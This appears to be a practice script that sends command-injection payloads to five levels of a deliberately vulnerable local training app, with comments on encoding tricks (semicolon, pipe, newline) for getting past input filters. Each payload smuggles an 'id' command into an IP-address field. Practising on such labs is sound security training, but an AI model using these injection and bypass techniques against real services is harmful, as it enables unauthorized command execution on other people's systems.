import requests
from bs4 import BeautifulSoup

s = requests.Session()

#LEVEL_1
url = 'http://localhost:9090/VulnerableApp/CommandInjection/LEVEL_1'

inj = ';id'
payload = '127.0.0.1'+ inj

#response = s.get(url, params={'ipaddress': payload})


#LEVEL_2 request automatically encode url, in case use %3B -> ; , %20-> space, %26 -> &

url = 'http://localhost:9090/VulnerableApp/CommandInjection/LEVEL_2'

inj = ';id'
payload = '127.0.0.1'+ inj

#response = s.get(url, params={'ipaddress': payload})


#LEVEL_3 request automatically encode url, in case use %7c -> |

url = 'http://localhost:9090/VulnerableApp/CommandInjection/LEVEL_3'

inj = '| id'
payload = '127.0.0.1'+ inj

#response = s.get(url, params={'ipaddress': payload})


#LEVEL_4 works using the pipe command, %7c -> |

url = 'http://localhost:9090/VulnerableApp/CommandInjection/LEVEL_4'

inj = '| id'
payload = '127.0.0.1'+ inj

#response = s.get(url, params={'ipaddress': payload})


#LEVEL_5 use the \n -> %0A to bypass control

url = 'http://localhost:9090/VulnerableApp/CommandInjection/LEVEL_5'

inj = '\nid'
payload = '127.0.0.1'+ inj

response = s.get(url, params={'ipaddress': payload})

print(response.text.strip())


